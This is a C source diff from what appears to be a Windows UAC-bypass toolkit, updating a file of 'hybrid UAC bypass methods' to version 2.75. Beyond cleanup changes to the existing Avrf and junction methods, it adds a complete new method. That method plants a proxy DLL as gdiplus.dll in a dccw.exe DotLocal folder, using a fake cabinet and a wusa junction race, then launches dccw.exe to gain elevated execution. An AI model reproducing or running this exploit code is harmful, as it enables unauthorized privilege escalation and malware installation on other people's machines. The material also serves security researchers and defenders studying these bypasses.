@@ -4,9 +4,9 @@
 *
 *  TITLE:       HYBRIDS.C
 *
-*  VERSION:     2.74
+*  VERSION:     2.75
 *
-*  DATE:        20 June 2017
+*  DATE:        30 June 2017
 *
 *  Hybrid UAC bypass methods.
 *
@@ -35,7 +35,7 @@ BOOL ucmAvrfMethod(
     DWORD AvrfDllSize
 )
 {
-    BOOL bResult = FALSE, cond = FALSE;
+    BOOL bResult = FALSE, cond = FALSE, bWusaNeedCleanup = FALSE;
     HKEY hKey = NULL, hSubKey = NULL;
     LRESULT lRet;
     DWORD dwValue = 0x100; // FLG_APPLICATION_VERIFIER;
@@ -62,7 +62,8 @@ BOOL ucmAvrfMethod(
         RtlSecureZeroMemory(szSourceDll, sizeof(szSourceDll));
         _strcpy(szSourceDll, g_ctx.szTempDirectory);
         _strcat(szSourceDll, HIBIKI_DLL);
-        if (!ucmCreateCabinetForSingleFile(szSourceDll, AvrfDll, AvrfDllSize))
+        bWusaNeedCleanup = ucmCreateCabinetForSingleFile(szSourceDll, AvrfDll, AvrfDllSize, NULL);
+        if (!bWusaNeedCleanup)
             break;
 
         // Drop Hibiki to system32
@@ -129,18 +130,18 @@ BOOL ucmAvrfMethod(
         RtlSecureZeroMemory(szSourceDll, sizeof(szSourceDll));
         _strcpy(szSourceDll, g_ctx.szTempDirectory);
         _strcat(szSourceDll, HIBIKI_DLL);
-        if (!ucmCreateCabinetForSingleFile(szSourceDll, AvrfDll, AvrfDllSize))
-            break;
+        if (ucmCreateCabinetForSingleFile(szSourceDll, AvrfDll, AvrfDllSize, NULL)) {
 
-        // Drop Hibiki to system32
-        if (!ucmWusaExtractPackage(g_ctx.szSystemDirectory))
-            break;
-
-        // Finally run target fusion process.
-        RtlSecureZeroMemory(szBuffer, sizeof(szBuffer));
-        _strcpy(szBuffer, g_ctx.szSystemDirectory);
-        _strcat(szBuffer, CLICONFG_EXE);
-        bResult = supRunProcess(szBuffer, NULL);
+            // Drop Hibiki to system32
+            if (ucmWusaExtractPackage(g_ctx.szSystemDirectory)) {
+                // Finally run target fusion process.
+                RtlSecureZeroMemory(szBuffer, sizeof(szBuffer));
+                _strcpy(szBuffer, g_ctx.szSystemDirectory);
+                _strcat(szBuffer, CLICONFG_EXE);
+                bResult = supRunProcess(szBuffer, NULL);
+            }
+            ucmWusaCabinetCleanup();
+        }
 
     } while (cond);
 
@@ -149,6 +150,9 @@ BOOL ucmAvrfMethod(
     }
     if (hSubKey != NULL) {
         RegCloseKey(hSubKey);
+    }
+    if (bWusaNeedCleanup) {
+        ucmWusaCabinetCleanup();
     }
     return bResult;
 }
@@ -1750,7 +1754,7 @@ BOOL ucmUiAccessMethod(
 * 2) Dll hijack dotnet dependencies.
 *
 * Wusa race condition in combination with junctions found by Thomas Vanhoutte.
-* Twitter: https://twitter.com/SandboxEscaper 
+* Twitter: https://twitter.com/SandboxEscaper
 * Blog: https://thomas-vanhoutte.blogspot.be
 *
 */
@@ -1759,7 +1763,7 @@ BOOL ucmJunctionMethod(
     DWORD ProxyDllSize
 )
 {
-    BOOL bResult = FALSE, bDropComplete = FALSE, bCond = FALSE;
+    BOOL bResult = FALSE, bDropComplete = FALSE, bCond = FALSE, bWusaNeedCleanup = FALSE;
     HKEY hKey = NULL;
     LRESULT lResult;
 
@@ -1784,7 +1788,9 @@ BOOL ucmJunctionMethod(
         else {
             _strcat(szSource, MSCOREE_DLL);
         }
-        if (!ucmCreateCabinetForSingleFile(szSource, ProxyDll, ProxyDllSize))
+
+        bWusaNeedCleanup = ucmCreateCabinetForSingleFile(szSource, ProxyDll, ProxyDllSize, NULL);
+        if (!bWusaNeedCleanup)
             break;
 
         //
@@ -1794,17 +1800,17 @@ BOOL ucmJunctionMethod(
         if (lResult != ERROR_SUCCESS)
             break;
 
-        lResult = RegQueryInfoKey(hKey, 
-            NULL, 
-            NULL, 
-            NULL, 
-            NULL, 
-            NULL, 
-            NULL, 
-            &cValues, 
-            &cbMaxValueNameLen, 
-            NULL, 
-            NULL, 
+        lResult = RegQueryInfoKey(hKey,
+            NULL,
+            NULL,
+            NULL,
+            NULL,
+            NULL,
+            NULL,
+            &cValues,
+            &cbMaxValueNameLen,
+            NULL,
+            NULL,
             NULL);
 
         if (lResult != ERROR_SUCCESS)
@@ -1822,17 +1828,17 @@ BOOL ucmJunctionMethod(
         // Drop file in each.
         //
         for (i = 0; i < cValues; i++) {
-            
+
             RtlSecureZeroMemory(&szBuffer, sizeof(szBuffer));
             bytesIO = MAX_PATH;
 
-            lResult = RegEnumValue(hKey, 
-                i, 
-                (LPWSTR)&szBuffer, 
-                &bytesIO, 
-                NULL, 
-                NULL, 
-                NULL, 
+            lResult = RegEnumValue(hKey,
+                i,
+                (LPWSTR)&szBuffer,
+                &bytesIO,
+                NULL,
+                NULL,
+                NULL,
                 NULL);
 
             lpTargetDirectory = _filepath(szBuffer, szBuffer);
@@ -1868,6 +1874,141 @@ BOOL ucmJunctionMethod(
 
     if (hKey != NULL)
         RegCloseKey(hKey);
+
+    if (bWusaNeedCleanup) {
+
+        //
+        // Remove cabinet file if exist.
+        //
+        ucmWusaCabinetCleanup();
+    }
+
+    return bResult;
+}
+
+/*
+* ucmSXSMethodDccw
+*
+* Purpose:
+*
+* Similar to ucmSXSMethod, except using different target app and dll.
+* Dccw idea by Ernesto Fernandez (https://github.com/L3cr0f/DccwBypassUAC)
+*
+*/
+BOOL ucmSXSMethodDccw(
+    PVOID ProxyDll,
+    DWORD ProxyDllSize
+)
+{
+    BOOL     bCond = FALSE, bResult = FALSE, bWusaNeedCleanup = FALSE;
+    HMODULE  hGdiPlus = NULL;
+    WCHAR   *lpszFullDllPath = NULL, *lpszDirectoryName = NULL;
+    SIZE_T   sz;
+    LPWSTR   lpSxsPath = NULL, lpEnd;
+
+    WCHAR szBuffer[MAX_PATH * 2], szTarget[MAX_PATH * 2];
+
+    SXS_SEARCH_CONTEXT sctx;
+
+    if ((ProxyDll == NULL) || (ProxyDllSize == 0))
+        return bResult;
+
+    do {
+        //
+        // Check if target app available. Maybe unavailable in server edition.
+        //
+        _strcpy(szTarget, g_ctx.szSystemDirectory);
+        _strcat(szTarget, DCCW_EXE);
+        if (!PathFileExists(szTarget))
+            break;
+
+        //
+        // Load GdiPlus in our address space to get it full path.
+        //
+        RtlSecureZeroMemory(szBuffer, sizeof(szBuffer));
+        _strcpy(szBuffer, g_ctx.szSystemDirectory);
+        _strcat(szBuffer, GDIPLUS_DLL);
+        hGdiPlus = LoadLibrary(szBuffer);
+        if (hGdiPlus == NULL)
+            break;
+
+        sz = UNICODE_STRING_MAX_BYTES;
+        NtAllocateVirtualMemory(NtCurrentProcess(), &lpszFullDllPath, 0, &sz, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+        if (lpszFullDllPath == NULL)
+            break;
+
+        sctx.DllName = GDIPLUS_DLL;
+        sctx.PartialPath = GDIPLUS_SXS;
+        sctx.FullDllPath = lpszFullDllPath;
+
+        if (!NT_SUCCESS(LdrEnumerateLoadedModules(0, &sxsFindDllCallback, (PVOID)&sctx)))
+            break;
+
+        lpszDirectoryName = _filename(lpszFullDllPath);
+        if (lpszDirectoryName == NULL)
+            break;
+
+        sz = 0x1000 + (_strlen(lpszDirectoryName) * sizeof(WCHAR));
+        NtAllocateVirtualMemory(NtCurrentProcess(), &lpSxsPath, 0, &sz, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+        if (lpSxsPath == NULL)
+            break;
+
+        //
+        // Create DotLocal path.
+        //
+        _strcpy(lpSxsPath, DCCW_EXE);
+        _strcat(lpSxsPath, LOCAL_SXS);
+        _strcat(lpSxsPath, TEXT("\\"));
+        _strcat(lpSxsPath, lpszDirectoryName);
+        _strcat(lpSxsPath, TEXT("\\"));
+        _strcat(lpSxsPath, GDIPLUS_DLL);
+
+        //
+        // Create fake cab file.
+        //
+        RtlSecureZeroMemory(szBuffer, sizeof(szBuffer));
+        _strcpy(szBuffer, g_ctx.szTempDirectory);
+        _strcat(szBuffer, GDIPLUS_DLL);
+
+        bWusaNeedCleanup = ucmCreateCabinetForSingleFile(szBuffer, ProxyDll, ProxyDllSize, lpSxsPath);
+        if (!bWusaNeedCleanup)
+            break;
+
+        _strcpy(szBuffer, g_ctx.szSystemDirectory);
+        lpEnd = _strend(szBuffer);
+        if (*(lpEnd - 1) == TEXT('\\'))
+            *(lpEnd - 1) = TEXT('\0');
+
+        if (!ucmWusaExtractViaJunction(szBuffer))
+            break;
+
+        //
+        // Run target.
+        //
+        bResult = supRunProcess(szTarget, NULL);
+
+    } while (bCond);
+
+    //
+    // Cleanup resources.
+    //
+
+    if (hGdiPlus != NULL)
+        FreeLibrary(hGdiPlus);
+
+    if (lpszFullDllPath) {
+        sz = 0;
+        NtFreeVirtualMemory(NtCurrentProcess(), &lpszFullDllPath, &sz, MEM_RELEASE);
+    }
+
+    if (lpSxsPath) {
+        sz = 0;
+        NtFreeVirtualMemory(NtCurrentProcess(), &lpSxsPath, &sz, MEM_RELEASE);
+    }
+
+    if (bWusaNeedCleanup) {
+        ucmWusaCabinetCleanup();
+    }
 
     return bResult;
 }
